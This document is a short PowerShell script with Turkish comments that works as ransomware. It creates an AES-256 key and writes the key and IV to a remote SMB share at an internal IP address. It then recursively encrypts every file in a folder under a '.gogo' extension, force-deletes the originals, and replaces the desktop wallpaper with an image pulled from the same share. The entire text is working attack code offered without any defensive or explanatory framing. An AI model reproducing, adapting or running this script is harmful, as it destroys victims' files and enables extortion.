# Klasör yolu ve şifreleme anahtarı
$folderPath = "C:\Users\Calculus\Desktop\foo"
$encryptionKey = New-Object Byte[] 32  # Rastgele 32 bayt (256 bit) anahtar oluştur
[System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($encryptionKey)

# AES şifreleme nesnesini oluştur
$aesManaged = New-Object System.Security.Cryptography.AesManaged
$aesManaged.Key = $encryptionKey
$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

# IV (Initialization Vector) otomatik olarak oluşturulur
$IV = $aesManaged.IV

# Anahtar ve IV'yi güvenli bir şekilde sakla
$keyFile = "\\192.168.43.157\smb\encryptionKey.bin"
$ivFile = "\\192.168.43.157\smb\encryptionIV.bin"
[System.IO.File]::WriteAllBytes($keyFile, $aesManaged.Key)
[System.IO.File]::WriteAllBytes($ivFile, $aesManaged.IV)

# Belirtilen klasördeki dosyaları şifrele ve orijinal dosyaları sil
Get-ChildItem -Path $folderPath -Recurse | Where-Object { -Not $_.PSIsContainer -and $_.Extension -ne ".gogo" } | ForEach-Object {
    $inputFile = $_.FullName
    $outputFile = "$inputFile.gogo"

    # Dosya içeriğini oku
    $content = [System.IO.File]::ReadAllBytes($inputFile)

    # Şifreleyici nesneyi oluştur ve veriyi şifrele
    $encryptor = $aesManaged.CreateEncryptor($aesManaged.Key, $aesManaged.IV)
    $encryptedData = $encryptor.TransformFinalBlock($content, 0, $content.Length)

    # IV'yi şifrelenmiş verinin başına ekleyerek dosyaya yaz
    $fileData = $IV + $encryptedData
    [System.IO.File]::WriteAllBytes($outputFile, $fileData)

    # Orijinal dosyayı sil
    Remove-Item $inputFile -Force

    # Şifreleyici nesneyi temizle
    $encryptor.Dispose()
}

# AES nesnesini temizle
$aesManaged.Dispose()

# Masaüstü arka planını değiştir
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Wallpaper {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@

# Yeni wallpaper yolu
$newWallpaperPath = "\\192.168.43.157\smb\gogo.png"
[Wallpaper]::SystemParametersInfo(0x0014, 0, $newWallpaperPath, 0x01 -bor 0x02)